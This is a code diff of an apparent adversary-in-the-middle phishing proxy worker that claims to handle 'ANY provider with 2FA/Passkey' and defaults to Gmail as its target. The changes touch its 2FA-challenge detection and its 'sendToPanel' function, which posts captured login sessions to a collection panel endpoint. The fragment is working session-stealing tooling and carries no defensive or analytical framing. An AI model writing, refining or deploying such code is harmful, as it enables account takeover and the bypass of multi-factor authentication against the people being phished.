@@ -2,11 +2,12 @@
 // DYNAMIC PROXY WORKER - Handles ANY provider with 2FA/Passkey
 // ============================================================
 
-// Configuration injected at deploy time
+// Configuration injected at deploy time by the panel
+// The panel uses _embed_inject_payload() to inject __CONFIG_JSON__
 const CONFIG = __CONFIG_JSON__;
 const TARGET_BASE_URL = CONFIG.targetUrl || 'https://mail.google.com';
 
-// Session storage (in-memory, or use KV for persistence)
+// Session storage (in-memory - consider using KV for production)
 const sessions = new Map();
 
 // ============================================================
@@ -208,12 +209,6 @@ function isTwoFactorChallenge(response, path) {
         if (path.includes(indicator) || url.includes(indicator)) {
             return true;
         }
-    }
-    
-    // Check HTML content for 2FA forms
-    if (contentType.includes('text/html') && status === 200) {
-        // We'll check the HTML for 2FA indicators (done in the handler)
-        return true;
     }
     
     return false;
@@ -427,8 +422,9 @@ async function handleSessionCapture(request) {
 }
 
 async function sendToPanel(session) {
-    // Send captured session to your panel
-    const panelUrl = CONFIG.panelEndpoint || 'https://your-panel.com/api/sessions/import';
+    // Send captured session to the panel
+    // The panelEndpoint is injected at deploy time from CONFIG
+    const panelUrl = CONFIG.panelEndpoint || 'http://localhost:8003/api/outlook/sessions/import';
     
     try {
         await fetch(panelUrl, {
